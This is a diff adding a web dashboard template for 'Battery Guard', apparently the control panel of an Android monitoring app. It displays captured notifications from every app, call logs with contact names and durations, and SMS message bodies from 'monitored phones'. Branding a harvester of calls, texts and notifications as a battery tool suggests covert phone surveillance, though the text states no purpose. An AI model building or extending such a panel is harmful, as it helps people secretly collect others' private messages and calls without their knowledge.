@@ -1,0 +1,168 @@
+{% extends 'base.html' %}
+
+{% block title %}Dashboard Overview — Battery Guard{% endblock %}
+
+{% block content %}
+<div class="header-bar">
+    <div>
+        <h1 class="page-title">Telemetry Overview</h1>
+        <p class="page-subtitle">Real-time status across connected devices</p>
+    </div>
+</div>
+
+<!-- Metrics Cards -->
+<div class="grid-cards">
+    <div class="stat-card" style="--card-accent: var(--accent-green);">
+        <span class="stat-label">Active Devices</span>
+        <span class="stat-value">{{ devices|length }}</span>
+        <span class="stat-meta">Monitored phones</span>
+    </div>
+
+    <div class="stat-card" style="--card-accent: var(--accent-blue);">
+        <span class="stat-label">Captured Notifications</span>
+        <span class="stat-value">{{ total_notifications }}</span>
+        <span class="stat-meta">Across all apps</span>
+    </div>
+
+    <div class="stat-card" style="--card-accent: var(--accent-purple);">
+        <span class="stat-label">Call Records</span>
+        <span class="stat-value">{{ total_calls }}</span>
+        <span class="stat-meta">Logged telephony calls</span>
+    </div>
+
+    <div class="stat-card" style="--card-accent: var(--accent-amber);">
+        <span class="stat-label">SMS Messages</span>
+        <span class="stat-value">{{ total_sms }}</span>
+        <span class="stat-meta">Inbound & outbound</span>
+    </div>
+</div>
+
+<!-- Registered Devices -->
+<div class="card-box">
+    <div class="card-box-header">
+        <h2 class="card-box-title">Registered Devices</h2>
+    </div>
+
+    {% if devices %}
+    <table>
+        <thead>
+            <tr>
+                <th>Device ID</th>
+                <th>Model</th>
+                <th>Android OS</th>
+                <th>App Ver</th>
+                <th>First Seen</th>
+                <th>Last Sync</th>
+                <th>Status</th>
+            </tr>
+        </thead>
+        <tbody>
+            {% for d in devices %}
+            <tr>
+                <td><code>{{ d.device_id }}</code></td>
+                <td><strong>{{ d.device_model }}</strong></td>
+                <td>Android {{ d.android_version }}</td>
+                <td>v{{ d.app_version }}</td>
+                <td class="time-text">{{ d.first_seen.strftime('%Y-%m-%d %H:%M') if d.first_seen else '-' }}</td>
+                <td class="time-text">{{ d.last_sync.strftime('%Y-%m-%d %H:%M:%S') if d.last_sync else '-' }}</td>
+                <td><span class="badge badge-green">Online</span></td>
+            </tr>
+            {% endfor %}
+        </tbody>
+    </table>
+    {% else %}
+    <div class="empty-state">
+        <p>No devices have checked in yet. Complete the setup wizard in the Android app to connect.</p>
+    </div>
+    {% endif %}
+</div>
+
+<div style="display: grid; grid-template-columns: 1fr 1fr; gap: 24px;">
+    <!-- Recent Notifications -->
+    <div class="card-box">
+        <div class="card-box-header">
+            <h2 class="card-box-title">Recent Notifications</h2>
+            <a href="{{ url_for('dashboard_notifications') }}" style="color: var(--accent-green); font-size: 13px; text-decoration: none;">View All &rarr;</a>
+        </div>
+
+        {% if recent_notifications %}
+        <table>
+            <thead>
+                <tr>
+                    <th>App</th>
+                    <th>Content</th>
+                    <th>Time</th>
+                </tr>
+            </thead>
+            <tbody>
+                {% for n in recent_notifications %}
+                <tr>
+                    <td><strong>{{ n.app_name or n.app_package }}</strong></td>
+                    <td>
+                        <div style="font-weight: 500;">{{ n.title or '-' }}</div>
+                        <div style="color: var(--text-secondary); font-size: 12px;">{{ n.content|truncate(60) if n.content else '-' }}</div>
+                    </td>
+                    <td class="time-text">{{ n.received_at.strftime('%H:%M') if n.received_at else '-' }}</td>
+                </tr>
+                {% endfor %}
+            </tbody>
+        </table>
+        {% else %}
+        <div class="empty-state">
+            <p>No notifications captured yet.</p>
+        </div>
+        {% endif %}
+    </div>
+
+    <!-- Recent Calls & SMS -->
+    <div class="card-box">
+        <div class="card-box-header">
+            <h2 class="card-box-title">Recent Telephony & SMS</h2>
+            <a href="{{ url_for('dashboard_calls') }}" style="color: var(--accent-green); font-size: 13px; text-decoration: none;">View Calls &rarr;</a>
+        </div>
+
+        {% if recent_calls or recent_sms %}
+        <table>
+            <thead>
+                <tr>
+                    <th>Type</th>
+                    <th>Contact / Number</th>
+                    <th>Details</th>
+                    <th>Time</th>
+                </tr>
+            </thead>
+            <tbody>
+                {% for c in recent_calls %}
+                <tr>
+                    <td>
+                        <span class="badge {% if c.call_type == 'incoming' %}badge-green{% elif c.call_type == 'outgoing' %}badge-blue{% else %}badge-red{% endif %}">
+                            Call ({{ c.call_type }})
+                        </span>
+                    </td>
+                    <td><strong>{{ c.contact_name or c.phone_number }}</strong></td>
+                    <td style="color: var(--text-secondary); font-size: 12px;">{{ c.duration_sec }}s duration</td>
+                    <td class="time-text">{{ c.occurred_at.strftime('%H:%M') if c.occurred_at else '-' }}</td>
+                </tr>
+                {% endfor %}
+                {% for s in recent_sms %}
+                <tr>
+                    <td>
+                        <span class="badge {% if s.sms_type == 'received' %}badge-green{% else %}badge-blue{% endif %}">
+                            SMS ({{ s.sms_type }})
+                        </span>
+                    </td>
+                    <td><strong>{{ s.contact_name or s.address }}</strong></td>
+                    <td style="color: var(--text-secondary); font-size: 12px;">{{ s.body|truncate(40) if s.body else '-' }}</td>
+                    <td class="time-text">{{ s.occurred_at.strftime('%H:%M') if s.occurred_at else '-' }}</td>
+                </tr>
+                {% endfor %}
+            </tbody>
+        </table>
+        {% else %}
+        <div class="empty-state">
+            <p>No calls or SMS captured yet.</p>
+        </div>
+        {% endif %}
+    </div>
+</div>
+{% endblock %}
